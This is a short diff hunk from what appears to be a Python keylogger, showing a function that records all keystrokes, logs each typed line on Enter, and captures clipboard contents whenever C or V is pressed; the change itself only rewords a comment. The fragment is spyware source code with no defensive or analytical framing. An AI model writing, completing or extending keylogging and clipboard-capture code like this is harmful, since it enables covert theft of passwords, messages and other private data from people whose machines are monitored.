@@ -72,7 +72,7 @@ def log_keystrokes(log_dir, log_name):  # Monitor and log all keystrokes from th
                 elif i == 0x0d:  # If 'ENTER' key is pressed, log the line and then clear the line variable
                     logging.info(line)
                     line.clear()
-                elif i == 0x43 or i == 0x56:  # If 'C' or 'V' pressed, capture the clipboard
+                elif i == 0x43 or i == 0x56:  # If 'C' or 'V' pressed, capture the clipboard contents
                     clipboard_data = capture_clipboard()
                     logging.info("[CLIPBOARD] {}".format(clipboard_data))
                 elif 0x30 <= i <= 0x5a:  # If 'A-Z/0-9', append to line
